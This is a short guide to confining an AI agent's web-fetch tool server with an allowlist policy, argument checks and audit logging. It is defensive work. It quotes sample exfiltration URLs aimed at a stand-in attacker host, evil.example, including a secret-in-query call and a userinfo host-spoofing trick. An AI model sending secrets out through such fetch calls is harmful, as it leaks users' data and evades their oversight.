# Keep a web-fetch tool on a leash

**Goal.** A `fetch`/`browse` server is useful for reading documentation and
dangerous for exfiltration (`fetch("https://evil.example/?q=<secret>")`). You
want the model to fetch from a handful of sites, both as a matter of policy
and as a matter of physics.

## Policy

`~/mcp/fetch.yml`:

```yaml
name: fetch

network:
  mode: allowlist
  allow:
    - docs.python.org
    - "*.readthedocs.io"
    - developer.mozilla.org

filesystem:
  read_write: [~/.cache/uv]       # uvx cache; see README "Servers started with npx / uvx"
  tmp: true

tools:
  default: deny
  rules:
    fetch:
      decision: allow
      args:
        url: { host: [network.allow] }   # the same list, checked on the request

lock:
  enabled: true

audit:
  path: ~/.local/state/mcp-jail/fetch.jsonl

sandbox:
  env: [PATH, HOME, LANG]
```

```json
"fetch": {
  "command": "mcp-jail",
  "args": ["run", "--policy", "/home/me/mcp/fetch.yml", "--", "uvx", "mcp-server-fetch"]
}
```

## Two fences

1. **The argument constraint** rejects a `tools/call` whose `url` host is not
   in `network.allow` before the server sees it. The model gets an error that
   says why, and tends to stop trying. `host:` accepts URLs and bare
   `host:port`; a userinfo trick (`https://docs.python.org@evil.example/`)
   is parsed as the real host, `evil.example`, and refused.
2. **The network allowlist** stops the server itself. Redirects, embedded
   resources, a "helpful" prefetch of a link on the page: on Linux they hit
   the fake DNS and die; on macOS they can only go through the proxy, which
   says no.

```json
{"ts":"2026-11-02T13:02:11Z","server":"fetch","kind":"tool_call","tool":"fetch","decision":"deny","reason":"args: argument \"url\": host \"evil.example\" not allowed"}
{"ts":"2026-11-02T13:02:40Z","server":"fetch","kind":"net","host":"docs.python.org","decision":"allow"}
{"ts":"2026-11-02T13:02:40Z","server":"fetch","kind":"net","host":"www.googletagmanager.com","decision":"blocked"}
```

That last line is a page's analytics script that the server tried to follow.
Harmless here, and exactly the kind of thing you want to see rather than
wonder about.

## Variations

- **A list that differs from the network list.** `host: ["*.example.org"]`
  constrains the argument on its own; combine with `network.allow` as you see
  fit. `optional: true` lets a call omit the argument.
- **Several URL-taking tools.** Each rule carries its own `args`; a rule
  without `args` is unconstrained.
